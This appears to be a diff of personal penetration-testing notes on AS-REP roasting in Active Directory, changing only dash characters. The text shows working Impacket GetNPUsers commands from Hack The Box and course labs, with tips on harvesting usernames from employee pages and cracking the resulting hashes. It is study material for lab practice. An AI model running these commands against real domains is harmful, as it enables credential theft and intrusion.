@@ -2,7 +2,7 @@
 
 Targets accounts with **"Do not require Kerberos preauthentication"** enabled.
 
-**No credentials needed** — just valid usernames.
+**No credentials needed** - just valid usernames.
 
 ---
 
@@ -51,17 +51,17 @@ After cracking → validate creds → continue [[AD-Methodology]] Phase 2.
 
 ## From Your Boxes
 
-> **Forest** (HTB) — AS-REP roasting with enumerated user list to get initial foothold
+> **Forest** (HTB) - AS-REP roasting with enumerated user list to get initial foothold
 > - What worked: `for user in $(cat users); do impacket-GetNPUsers -no-pass -dc-ip TARGET_IP htb/${user} | grep -v Impacket; done`
 > - Cracked hash for `svc-alfresco` which led to WinRM access and full domain compromise
 > - Lesson: Loop GetNPUsers over all enumerated users when you have no creds at all
 
-> **Sauna** (HTB) — AS-REP roasting after building username list from website "About" page
+> **Sauna** (HTB) - AS-REP roasting after building username list from website "About" page
 > - What worked: `impacket-getNPUsers 'EGOTISTICAL-BANK.LOCAL/' -usersfile users.txt -format hashcat -outputfile hashes.asreproast -dc-ip TARGET`
 > - Built username list from employee names on the bank website, cracked hash for `fsmith`
 > - Lesson: Scrape employee names from websites and generate username permutations (first.last, f.last, flast)
 
-> **Relia** (Course) — AS-REP roasting the DC after pivoting into internal network
+> **Relia** (Course) - AS-REP roasting the DC after pivoting into internal network
 > - What worked: `impacket-GetNPUsers -dc-ip INTERNAL_IP -request -outputfile hashes.asreproast relia.com/jim`
 > - Gained Michelle's hash after pivoting, used it to move deeper into the domain
-> - Lesson: AS-REP roast from inside the network after pivoting — not just from the outside
+> - Lesson: AS-REP roast from inside the network after pivoting - not just from the outside
